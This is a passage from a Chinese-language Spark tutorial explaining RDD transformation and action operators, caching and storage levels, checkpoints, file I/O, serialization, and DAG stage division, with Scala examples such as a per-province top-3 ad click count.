RDD(无返回值或返回其他的)</strong></li></ul><blockquote><p>❣️ 注意:<br>1、RDD 不实际存储真正要计算的数据，而是记录了数据的位置在哪里，数据的转换关系(调用了什么方法，传入什么函数)。<br>2、RDD 中的所有转换都是惰性求值/延迟执行的，也就是说并不会直接计算。只有当发生一个要求返回结果给 Driver 的 Action 动作时，这些转换才会真正运行。<br>3、之所以使用惰性求值/延迟执行，是因为这样可以在 Action 时对 RDD 操作形成 DAG 有向无环图进行 Stage 的划分和并行优化，这种设计让 Spark 更加有效率地运行。</p></blockquote><p><strong>Transformation 转换算子</strong></p><table><thead><tr><th><strong>转换算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td><strong>map</strong>(func)</td><td>返回一个新的 RDD，该 RDD 由每一个输入元素经过 func 函数转换后组成</td></tr><tr><td><strong>filter</strong>(func)</td><td>返回一个新的 RDD，该 RDD 由经过 func 函数计算后返回值为 true 的输入元素组成；;当数据进行筛选过滤后，分区不变，但是分区内的数据可能不均衡，生产环境下，可能会出现数据倾斜</td></tr><tr><td><strong>flatMap</strong>(func)</td><td>类似于 map，但是每一个输入元素可以被映射为 0 或多个输出元素(所以 func 应该返回一个序列，而不是单一元素，)</td></tr><tr><td><strong>mapPartitions</strong>(func)</td><td>类似于 map，但独立地在 RDD 的每一个分片上运行，因此在类型为 T 的 RDD 上运行时，func 的函数类型必须是 Iterator[T] =&gt; Iterator[U]，性能高但容易内存溢出，内存少用map</td></tr><tr><td><strong>mapPartitionsWithIndex</strong>(func)</td><td>类似于 mapPartitions，但 func 带有一个整数参数表示分片的索引值，因此在类型为 T 的 RDD 上运行时，func 的函数类型必须是(Int, Interator[T]) =&gt; Iterator[U]</td></tr><tr><td>glom(func)</td><td>将同一个分区的数据直接转换为相同类型的内存数组进行处理，分区不变</td></tr><tr><td>groupBy(func)</td><td>将数据根据指定的规则进行分组, 分区默认不变，但是数据会被打乱重新组合，我们将这样的操作称之为 shuffle。 groupBy[K](f: T =&gt; K)</td></tr><tr><td>sample(withReplacement, fraction, seed)</td><td>根据 fraction 指定的比例对数据进行采样，可以选择是否使用随机数进行替换，seed 用于指定随机数生成器种子</td></tr><tr><td><strong>union</strong>(otherDataset)</td><td>对源 RDD 和参数 RDD 求并集后返回一个新的 RDD</td></tr><tr><td>intersection(otherDataset)</td><td>对源 RDD 和参数 RDD 求交集后返回一个新的 RDD；subtract为差集；zip为拉链；sliding为滑窗</td></tr><tr><td><strong>distinct</strong>([numTasks]))</td><td>对源 RDD 进行去重后返回一个新的 RDD</td></tr><tr><td>partitionBy(partitioner)</td><td>将数据按照指定 Partitioner 重新进行分区。Spark 默认的分区器是 HashPartitioner</td></tr><tr><td><strong>groupByKey</strong>([numTasks])</td><td>在一个(K,V)的 RDD 上调用,将数据源的数据根据 key 对 value 进行分组(相同的key把value放一起，group by的话还是会包括key,value)，返回一个(K, Iterator[V])的 RDD，推荐使用</td></tr><tr><td><strong>reduceByKey</strong>(func, [numTasks])</td><td>在一个(K,V)的 RDD 上调用，返回一个(K,V)的 RDD，使用指定的 reduce 函数，将相同 key 的值聚合到一起，与 groupByKey 类似，reduce 任务的个数可以通过第二个可选的参数来设置(有效减少落盘)</td></tr><tr><td>aggregateByKey(zeroValue)(seqOp, combOp, [numTasks])</td><td>对 PairRDD 中相同的 Key 值进行聚合操作，在聚合过程中同样使用了一个中立的初始值。和 aggregate 函数类似，aggregateByKey 返回值的类型不需要和 RDD 中 value 的类型一致(第一个函数是分区内，第二个是分区间)</td></tr><tr><td>foldByKey(zeroValue)(func)</td><td>当分区内计算规则和分区间计算规则相同时，aggregateByKey 就可以简化为 foldByKey</td></tr><tr><td><strong>combineByKey</strong>(func1,func2,func3)</td><td>最通用的对 key-value 型 rdd 进行聚集操作的聚集函（aggregation function）。类似于aggregate()，combineByKey()允许用户返回值的类型与输入不一致。参数一将相同key的第一个数据进行结构的转换实现操作，参数二表示分区内的计算规则，参数三表示分区间的计算规则;上面几个底层调用都是这个函数</td></tr><tr><td><strong>sortByKey</strong>([ascending], [numTasks])</td><td>在一个(K,V)的 RDD 上调用，K 必须实现 Ordered 接口，返回一个按照 key 进行排序的(K,V)的 RDD</td></tr><tr><td>sortBy(func,[ascending], [numTasks])</td><td>与 sortByKey 类似，但是更灵活，存在shuffle，默认为升序排列。排序后新产生的 RDD 的分区数与原 RDD 的分区数一致</td></tr><tr><td><strong>join</strong>(otherDataset, [numTasks])</td><td>在类型为(K,V)和(K,W)的 RDD 上调用，返回一个相同 key 对应的所有元素对在一起的(K,(V,W))的 RDD，还有leftOuterJoin函数</td></tr><tr><td>cogroup(otherDataset, [numTasks])</td><td>在类型为(K,V)和(K,W)的 RDD 上调用，返回一个(K,(Iterable,Iterable))类型的 RDD</td></tr><tr><td>cartesian(otherDataset)</td><td>笛卡尔积</td></tr><tr><td>pipe(command, [envVars])</td><td>对 rdd 进行管道操作</td></tr><tr><td><strong>coalesce</strong>(numPartitions,isShuffle)</td><td>减少 RDD 的分区数到指定值。在过滤大量数据之后，可以执行此操作，默认是不shuffle</td></tr><tr><td><strong>repartition</strong>(numPartitions)</td><td>重新给 RDD 分区，一般用来扩大分区</td></tr></tbody></table><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个举例，统计出每一个省份每个广告被点击数量排行的 Top3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> sparkConf = <span class="keyword">new</span> <span class="type">SparkConf</span>().setMaster(<span class="string">"local[*]"</span>).setAppName(<span class="string">"Operator"</span>)</span><br><span class="line">    <span class="keyword">val</span> sc = <span class="keyword">new</span> <span class="type">SparkContext</span>(sparkConf)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO 案例实操</span></span><br><span class="line">    <span class="comment">// 1. 获取原始数据：时间戳，省份，城市，用户，广告</span></span><br><span class="line">    <span class="keyword">val</span> dataRDD = sc.textFile(<span class="string">"datas/agent.log"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 将原始数据进行结构的转换。方便统计</span></span><br><span class="line">    <span class="comment">//    时间戳，省份，城市，用户，广告</span></span><br><span class="line">    <span class="comment">//    =&gt;</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), 1 )</span></span><br><span class="line">    <span class="keyword">val</span> mapRDD = dataRDD.map(</span><br><span class="line">        line =&gt; &#123;</span><br><span class="line">            <span class="keyword">val</span> datas = line.split(<span class="string">" "</span>)</span><br><span class="line">            (( datas(<span class="number">1</span>), datas(<span class="number">4</span>) ), <span class="number">1</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将转换结构后的数据，进行分组聚合</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), 1 ) =&gt; ( ( 省份，广告 ), sum )</span></span><br><span class="line">    <span class="keyword">val</span> reduceRDD: <span class="type">RDD</span>[((<span class="type">String</span>, <span class="type">String</span>), <span class="type">Int</span>)] = mapRDD.reduceByKey(_+_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 将聚合的结果进行结构的转换</span></span><br><span class="line">    <span class="comment">//    ( ( 省份，广告 ), sum ) =&gt; ( 省份, ( 广告, sum ) )</span></span><br><span class="line">    <span class="keyword">val</span> newMapRDD = reduceRDD.map&#123;</span><br><span class="line">        <span class="keyword">case</span> ( (prv, ad), sum ) =&gt; &#123;</span><br><span class="line">            (prv, (ad, sum))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 将转换结构后的数据根据省份进行分组</span></span><br><span class="line">    <span class="comment">//    ( 省份, 【( 广告A, sumA )，( 广告B, sumB )】 )</span></span><br><span class="line">    <span class="keyword">val</span> groupRDD: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Iterable</span>[(<span class="type">String</span>, <span class="type">Int</span>)])] = newMapRDD.groupByKey()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 将分组后的数据组内排序（降序），取前3名</span></span><br><span class="line">    <span class="keyword">val</span> resultRDD = groupRDD.mapValues(</span><br><span class="line">        iter =&gt; &#123;</span><br><span class="line">            iter.toList.sortBy(_._2)(<span class="type">Ordering</span>.<span class="type">Int</span>.reverse).take(<span class="number">3</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 采集数据打印在控制台</span></span><br><span class="line">    resultRDD.collect().foreach(println)</span><br><span class="line">    sc.stop()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-RDD-行动算子">3.4 RDD 行动算子</h3><p><strong>动作算子</strong></p><table><thead><tr><th><strong>动作算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>reduce(func)</td><td>通过 func 函数聚集 RDD 中的所有元素，这个功能必须是可交换且可并联的；聚集 RDD 中的所有元素，先聚合分区内数据，再聚合分区间数据</td></tr><tr><td>collect()</td><td>在驱动程序中，以数组的形式返回数据集的所有元素</td></tr><tr><td>count()</td><td>返回 RDD 的元素个数</td></tr><tr><td>first()</td><td>返回 RDD 的第一个元素(类似于 take(1))</td></tr><tr><td>take(n)</td><td>返回一个由数据集的前 n 个元素组成的数组</td></tr><tr><td>takeSample(withReplacement,num, [seed])</td><td>返回一个数组，该数组由从数据集中随机采样的 num 个元素组成，可以选择是否用随机数替换不足的部分，seed 用于指定随机数生成器种子</td></tr><tr><td>takeOrdered(n, [ordering])</td><td>返回自然顺序或者自定义顺序的前 n 个元素</td></tr><tr><td>aggregate(zeroValue)(U,T)</td><td>分区的数据通过初始值和分区内的数据进行聚合，然后再和初始值进行分区间的数据聚合</td></tr><tr><td>fold(zeroValue)(U,T)</td><td>折叠操作，aggregate 的简化版操作</td></tr><tr><td><strong>countByKey</strong>()</td><td>针对(K,V)类型的 RDD，返回一个(K,Int)的 map，表示每一个 key 对应的元素个数</td></tr><tr><td><strong>saveAsTextFile</strong>(path)</td><td>将数据集的元素以 textfile 的形式保存到 HDFS 文件系统或者其他支持的文件系统，对于每个元素，Spark 将会调用 toString 方法，将它装换为文件中的文本</td></tr><tr><td><strong>saveAsSequenceFile</strong>(path)</td><td>将数据集中的元素以 Hadoop sequencefile 的格式保存到指定的目录下，可以使 HDFS 或者其他 Hadoop 支持的文件系统，必须键值对</td></tr><tr><td>saveAsObjectFile(path)</td><td>将数据集的元素，以 Java 序列化的方式保存到指定的目录下</td></tr><tr><td>foreach(func)</td><td>在数据集的每一个元素上，运行函数 func 进行更新；rdd.collect().foreach(println)是driver端执行，而rdd.foreach(println)是在excutor端执行</td></tr><tr><td><strong>foreachPartition</strong>(func)</td><td>在数据集的每一个分区上，运行函数 func</td></tr></tbody></table><p><em><strong>统计操作</strong></em></p><table><thead><tr><th><strong>算子</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>count</td><td>个数</td></tr><tr><td>mean</td><td>均值</td></tr><tr><td>sum</td><td>求和</td></tr><tr><td>max</td><td>最大值</td></tr><tr><td>min</td><td>最小值</td></tr><tr><td><em>variance</em></td><td>方差</td></tr><tr><td>sampleVariance</td><td>从采样中计算方差</td></tr><tr><td><em>stdev</em></td><td>标准差:衡量数据的离散程度</td></tr><tr><td>sampleStdev</td><td>采样的标准差</td></tr><tr><td>stats</td><td>查看统计结果</td></tr></tbody></table><h3 id="3-5-RDD-的持久化-缓存">3.5 RDD 的持久化/缓存</h3><p>RDD 通过 Cache 或者 Persist 方法将前面的计算结果缓存，默认情况下会把数据以缓存在 JVM 的堆内存中。但是并不是这两个方法被调用时立即缓存，而是触发后面的 action 算子时，该 RDD 将会被缓存在计算节点的内存中，并供后面重用</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cache 操作会增加血缘关系，不改变原有的血缘关系</span></span><br><span class="line">println(wordToOneRdd.toDebugString)</span><br><span class="line"><span class="comment">// 数据缓存</span></span><br><span class="line">wordToOneRdd.cache()</span><br><span class="line"><span class="comment">// 可以更改存储级别，持久化操作必须在行动算子执行时完成的</span></span><br><span class="line"><span class="comment">//mapRdd.persist(StorageLevel.MEMORY_AND_DISK_2)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认的存储级别都是仅在内存存储一份，Spark 的存储级别还有好多种，存储级别在 object StorageLevel 中定义的</span></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">StorageLevel</span> </span>&#123;</span><br><span class="line">  <span class="keyword">val</span> <span class="type">NONE</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">DISK_ONLY</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">DISK_ONLY_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_SER</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_ONLY_SER_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">false</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">true</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_SER</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">MEMORY_AND_DISK_SER_2</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="literal">false</span>, <span class="number">2</span>)</span><br><span class="line">  <span class="keyword">val</span> <span class="type">OFF_HEAP</span> = <span class="keyword">new</span> <span class="type">StorageLevel</span>(<span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">true</span>, <span class="literal">false</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th>持久化级别</th><th>说明</th></tr></thead><tbody><tr><td><strong>MORY_ONLY(默认)</strong></td><td>将 RDD 以非序列化的 Java 对象存储在 JVM 中。 如果没有足够的内存存储 RDD，则某些分区将不会被缓存，每次需要时都会重新计算。 这是默认级别</td></tr><tr><td><strong>MORY_AND_DISK(开发中可以使用这个)</strong></td><td>将 RDD 以非序列化的 Java 对象存储在 JVM 中。如果数据在内存中放不下，则溢写到磁盘上．需要时则会从磁盘上读取</td></tr><tr><td>MEMORY_ONLY_SER (Java and Scala)</td><td>将 RDD 以序列化的 Java 对象(每个分区一个字节数组)的方式存储．这通常比非序列化对象(deserialized objects)更具空间效率，特别是在使用快速序列化的情况下，但是这种方式读取数据会消耗更多的 CPU</td></tr><tr><td>MEMORY_AND_DISK_SER (Java and Scala)</td><td>与 MEMORY_ONLY_SER 类似，但如果数据在内存中放不下，则溢写到磁盘上，而不是每次需要重新计算它们</td></tr><tr><td>DISK_ONLY</td><td>将 RDD 分区存储在磁盘上</td></tr><tr><td>MEMORY_ONLY_2, MEMORY_AND_DISK_2 等</td><td>与上面的储存级别相同，只不过将持久化数据存为两份，备份每个分区存储在两个集群节点上</td></tr><tr><td>OFF_HEAP(实验中)</td><td>与 MEMORY_ONLY_SER 类似，但将数据存储在堆外内存中。 (即不是直接存储在 JVM 内存中)</td></tr></tbody></table><p>RDD 持久化/缓存的目的是为了提高后续操作的速度；缓存的级别有很多，默认只存在内存中,开发中使用 memory_and_disk；只有执行 action 操作的时候才会真正将 RDD 数据进行持久化/缓存；实际开发中如果某一个 RDD 后续会被频繁的使用，可以将该 RDD 进行持久化/缓存</p><h3 id="3-6-RDD-容错机制-Checkpoint">3.6 RDD 容错机制 Checkpoint</h3><p>所谓的检查点其实就是通过将 RDD 中间结果写入磁盘由于血缘依赖过长会造成容错成本过高，这样就不如在中间阶段做检查点容错，如果检查点之后有节点出现问题，可以从检查点开始重做血缘，减少了开销。对 RDD 进行 checkpoint 操作并不会马上被执行，必须执行 Action 操作才能触发</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// cache : 将数据临时存储在内存中进行数据重用</span></span><br><span class="line"><span class="comment">//         会在血缘关系中添加新的依赖。一旦，出现问题，可以重头读取数据</span></span><br><span class="line"><span class="comment">// persist : 将数据临时存储在磁盘文件中进行数据重用</span></span><br><span class="line"><span class="comment">//           涉及到磁盘IO，性能较低，但是数据安全</span></span><br><span class="line"><span class="comment">//           如果作业执行完毕，临时保存的数据文件就会丢失</span></span><br><span class="line"><span class="comment">// checkpoint : 将数据长久地保存在磁盘文件中进行数据重用</span></span><br><span class="line"><span class="comment">//           涉及到磁盘IO，性能较低，但是数据安全</span></span><br><span class="line"><span class="comment">//           为了保证数据安全，所以一般情况下，会独立执行作业</span></span><br><span class="line"><span class="comment">//           为了能够提高效率，一般情况下，是需要和cache联合使用</span></span><br><span class="line"><span class="comment">//           执行过程中，会切断血缘关系。重新建立新的血缘关系</span></span><br><span class="line"><span class="comment">//           checkpoint等同于改变数据源</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">// 设置检查点路径</span></span><br><span class="line">sc.setCheckpointDir(<span class="string">"./checkpoint1"</span>)</span><br><span class="line"><span class="comment">//SparkContext.setCheckpointDir("目录") //HDFS的目录</span></span><br><span class="line"><span class="comment">// 创建一个 RDD，读取指定位置文件:hello atguigu atguigu</span></span><br><span class="line"><span class="keyword">val</span> lineRdd: <span class="type">RDD</span>[<span class="type">String</span>] = sc.textFile(<span class="string">"input/1.txt"</span>)</span><br><span class="line"><span class="comment">// 业务逻辑</span></span><br><span class="line"><span class="keyword">val</span> wordRdd: <span class="type">RDD</span>[<span class="type">String</span>] = lineRdd.flatMap(line =&gt; line.split(<span class="string">" "</span>))</span><br><span class="line"><span class="keyword">val</span> wordToOneRdd: <span class="type">RDD</span>[(<span class="type">String</span>, <span class="type">Long</span>)] = wordRdd.map &#123;</span><br><span class="line">  word =&gt; &#123;</span><br><span class="line">    (word, <span class="type">System</span>.currentTimeMillis())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 增加缓存,避免再重新跑一个 job 做 checkpoint</span></span><br><span class="line">wordToOneRdd.cache()</span><br><span class="line"><span class="comment">// 数据检查点：针对 wordToOneRdd 做检查点计算</span></span><br><span class="line">wordToOneRdd.checkpoint()</span><br><span class="line"><span class="comment">// 触发执行逻辑</span></span><br><span class="line">wordToOneRdd.collect().foreach(println)</span><br></pre></td></tr></table></figure><p><strong>缓存和检查点区别</strong></p><ul><li>Cache 缓存只是将数据保存起来，不切断血缘依赖。Checkpoint 检查点切断血缘依赖</li><li>Cache 缓存的数据通常存储在磁盘、内存等地方，可靠性低。Checkpoint 的数据通常存储在 HDFS 等容错、高可用的文件系统，可靠性高</li><li>建议对 checkpoint()的 RDD 使用 Cache 缓存，这样 checkpoint 的 job 只需从 Cache 缓存中读取数据即可，否则需要再从头计算一次 RDD</li></ul><h3 id="3-7-RDD-文件读取与保存">3.7 RDD 文件读取与保存</h3><p>Spark 的数据读取及数据保存可以从两个维度来作区分：文件格式以及文件系统。文件格式分为：text 文件、csv 文件、sequence 文件以及 Object 文件；文件系统分为：本地文件系统、HDFS、HBASE 以及数据库</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 读取输入文件</span></span><br><span class="line"><span class="keyword">val</span> inputRDD: <span class="type">RDD</span>[<span class="type">String</span>] = sc.textFile(<span class="string">"input/1.txt"</span>)</span><br><span class="line"><span class="comment">// 保存数据</span></span><br><span class="line">inputRDD.saveAsTextFile(<span class="string">"output"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//quenceFile 文件是 Hadoop 用来存储二进制形式的 key-value 对而设计的一种平面文件(Flat File)</span></span><br><span class="line"><span class="comment">// 保存数据为 SequenceFile</span></span><br><span class="line">dataRDD.saveAsSequenceFile(<span class="string">"output"</span>)</span><br><span class="line"><span class="comment">// 读取 SequenceFile 文件</span></span><br><span class="line">sc.sequenceFile[<span class="type">Int</span>,<span class="type">Int</span>](<span class="string">"output"</span>).collect().foreach(println)</span><br><span class="line"></span><br><span class="line"><span class="comment">//对象文件是将对象序列化后保存的文件，采用 Java 的序列化机制</span></span><br><span class="line">dataRDD.saveAsObjectFile(<span class="string">"output"</span>)</span><br><span class="line"><span class="comment">// 读取数据</span></span><br><span class="line">sc.objectFile[<span class="type">Int</span>](<span class="string">"output"</span>).collect().foreach(println)</span><br></pre></td></tr></table></figure><h2 id="4、RDD其他概念">4、RDD其他概念</h2><h3 id="4-1-RDD序列化">4.1 RDD序列化</h3><p><strong>闭包检查</strong></p><p>从计算的角度, 算子以外的代码都是在Driver 端执行, 算子里面的代码都是在Executor 端执行。那么在 scala 的函数式编程中，就会导致算子内经常会用到算子外的数据，这样就形成了闭包的效果，如果使用的算子外的数据无法序列化，就意味着无法传值给Executor 端执行，就会发生错误，所以需要在执行任务计算前，检测闭包内的对象是否可以进行序列化，这个操作我们称之为闭包检测。Scala2.12 版本后闭包编译方式发生了改变</p><p><strong>序列化方法和属性</strong></p><p>从计算的角度, 算子以外的代码都是在Driver 端执行, 算子里面的代码都是在Executor</p><p><strong>Kryo 序列化框架</strong></p><blockquote><p>参考地址: <a href="https://github.com/EsotericSoftware/kryo" target="_blank" rel="noopener" title="https://github.com/EsotericSoftware/kryo">https://github.com/EsotericSoftware/kryo</a></p></blockquote><p>Java 的序列化能够序列化任何的类。但是比较重（字节多），序列化后，对象的提交也比较大。Spark 出于性能的考虑，Spark2.0 开始支持另外一种Kryo 序列化机制。Kryo 速度是 Serializable 的 10 倍。当 RDD 在 Shuffle 数据的时候，简单数据类型、数组和字符串类型已经在 Spark 内部使用 Kryo 来序列化。注意：即使使用Kryo 序列化，也要继承Serializable 接口</p><h3 id="4-2-RDD-依赖关系">4.2 RDD 依赖关系</h3><p>RDD 的Lineage 会记录RDD 的元数据信息和转换行为，当该RDD 的部分分区数据丢失时，它可以根据这些信息来重新运算和恢复丢失的数据分区，RDD存在<em>两种依赖关系类型</em>：  <strong>宽依赖</strong>(wide dependency/shuffle dependency) <strong>窄依赖</strong>(narrow dependency)</p><ul><li>窄依赖:父 RDD 的一个分区只会被子 RDD 的一个分区依赖；窄依赖的多个分区可以并行计算；  窄依赖的一个分区的数据如果丢失只需要重新计算对应的分区的数据就可以了</li><li>宽依赖:父 RDD 的一个分区会被子 RDD 的多个分区依赖(涉及到 shuffle)；对于宽依赖,必须等到上一阶段计算完成才能计算下一阶段</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816202.png" alt></p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看血缘关系</span></span><br><span class="line">println(fileRDD.toDebugString)</span><br><span class="line"><span class="comment">//查看依赖</span></span><br><span class="line">println(wordRDD.dependencies)</span><br></pre></td></tr></table></figure><h3 id="4-3-DAG-的生成和划分-Stage">4.3 DAG 的生成和划分 Stage</h3><blockquote><p>DAG(Directed Acyclic Graph 有向无环图)指的是数据转换执行的过程，有方向，无闭环(其实就是 RDD 执行的流程)；  原始的 RDD 通过一系列的转换操作就形成了 DAG 有向无环图，任务执行时，可以按照 DAG 的描述，执行真正的计算(数据被操作的一个过程)</p></blockquote><p>对于DAG的边界，开始通过 <code>SparkContext</code> 创建的 RDD；触发 Action结束，一旦触发 Action 就形成了一个完整的 DAG。RDD 任务切分中间分为：Application、Job、Stage 和 Task，<strong>注意：Application-&gt;Job-&gt;Stage-&gt;Task 每一层都是 1 对 n 的关系</strong></p><ul><li>Application：初始化一个 SparkContext 即生成一个 Application；</li><li>Job：一个 Action 算子就会生成一个 Job；</li><li>Stage：Stage 等于宽依赖(ShuffleDependency)的个数加 1；</li><li>Task：一个 Stage 阶段中，最后一个 RDD 的分区个数就是 Task 的个数</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202402291816203.png" alt></p><p><strong>一个 Spark 程序可以有多个 DAG(有几个 Action，就有几个 DAG，图最后只有一个 Action那么就是一个 DAG)</strong>。一个 DAG 可以有多个 Stage(根据宽依赖/shuffle 进行划分)。<strong>同一个 Stage 可以有多个 Task 并行执行</strong>(<strong>task 数=分区数</strong>，如图Stage1 中有三个分区 P1、P2、P3，对应的也有三个 Task)。可以看到这个 DAG 中只 reduceByKey 操作是一个宽依赖，Spark 内核会以此为边界将其前后划分成不同的 Stage。同时我们可以注意到，在图中 Stage1 中，<strong>从 textFile 到 flatMap 到 map 都是窄依赖，这几步操作可以形成一个流水线操作，通过 flatMap 操作生成的 partition 可以不用等待整个 RDD 计算结束，而是继续进行 map 操作，这样大大提高了计算的效率</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202402291816204.png" alt></p><ul><li><strong>为什么要划分 Stage? --并行计算</strong></li></ul><p>一个复杂的业务逻辑如果有 shuffle，那么就意味着前面阶段产生结果后，才能执行下一个阶段，即下一个阶段的计算要依赖上一个阶段的数据。那么我们按照 shuffle 进行划分(也就是按照宽依赖就行划分)，就可以将一个 DAG 划分成多个 Stage/阶段，在同一个 Stage 中，会有多个算子操作，可以形成一个 pipeline 流水线，流水线内的多个平行的分区可以并行执行</p><ul><li><strong>如何划分 DAG 的 stage？</strong></li></ul><p>对于窄依赖，partition 的转换处理在 stage 